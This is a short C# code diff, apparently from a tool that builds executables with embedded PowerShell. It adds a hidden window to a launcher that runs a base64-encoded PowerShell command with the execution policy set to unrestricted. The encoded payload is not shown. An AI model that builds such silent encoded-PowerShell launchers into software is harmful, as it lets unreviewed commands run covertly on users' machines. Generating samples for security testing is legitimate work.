@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Diagnostics;
-using System.Reflection;
 
 namespace cwg.sourcePEwithPS
 {
@@ -8,9 +7,14 @@ namespace cwg.sourcePEwithPS
     {
         public static byte[] ExtractResource(string filename)
         {
-            var resourceName = $"{typeof(Program).Assembly.GetName().Name.Replace("-", "_")}.{filename}";
+            var resourceName = $"{typeof(Program).Assembly.GetName().Name?.Replace("-", "_")}.{filename}";
             
             using var stream = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName);
+
+            if (stream == null)
+            {
+                return Array.Empty<byte>();
+            }
             
             var ba = new byte[stream.Length];
             
@@ -29,7 +33,8 @@ namespace cwg.sourcePEwithPS
             {
                 FileName = "powershell.exe",
                 Arguments = $"-NoProfile -ExecutionPolicy unrestricted -EncodedCommand {psCommandBase64}",
-                UseShellExecute = false
+                UseShellExecute = false,
+                CreateNoWindow = true
             };
             
             Process.Start(startInfo);
